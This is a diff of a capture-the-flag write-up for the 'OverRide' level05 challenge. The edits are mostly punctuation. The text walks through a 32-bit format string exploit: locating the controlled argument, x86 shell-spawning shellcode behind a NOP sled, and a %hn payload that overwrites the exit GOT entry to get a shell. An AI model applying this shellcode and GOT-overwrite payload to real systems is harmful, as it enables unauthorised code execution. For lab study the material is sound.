@@ -9,12 +9,12 @@ level05@OverRide:~$ ./level05
 ```
 We have another 32bit program with vulnerable format strings on our hands.
 
-Let's find where we control the buffer
+Let's find where we control the buffer:
 ```shell
 level05@OverRide:~$ ./level05 < <(python -c 'print "BBBB" + "%p|"*10') 
 bbbb0x64|0xf7fcfac0|0xf7ec3add|0xffffd6ef|0xffffd6ee|(nil)|0xffffffff|0xffffd774|0xf7fdb000|0x62626262|
 ```
-Oh yeah, our uppercase characters get converted to lowercase, but we can see it's the 10th arg
+Oh yeah, our uppercase characters get converted to lowercase, but we can see it's the 10th argument:
 ```shell
 level05@OverRide:~$ ./level05 < <(python -c 'print "0000%10$p"')
 00000x30303030
@@ -32,7 +32,7 @@ End of assembler dump.
 ```
 `0x80497e0` is `exit` in the GOT
 
-But this time we don't just have a function to call, what are we gonna do!
+But this time we don't just have a function to call, what are we gonna do!?
 ```shell
 export PWN=$(python -c 'print "\x90"*500 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
 ```
@@ -67,14 +67,14 @@ Which translates to:
 Which should give us before conversions
 `(0x80497E0 + 0x80497E2) + ( %(0xDD74-8)$x + %10$hn ) + ( %(0xFFFF-DD74)$x  + %11$hn)`
 
-in python:
+In python:
 ```python
 "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"
 ```
 
 Let's try it
 ```shell
-level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"' ; cat ) | ./level05 
+level05@OverRide:~$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%{}c".format(0xdd74-8) + "%10$hn" + "%{}c".format(0xffff-0xdd74) + "%11$hn"' ; cat ) | ./level05 | tr -d ' '
 
 [...]
 whoami
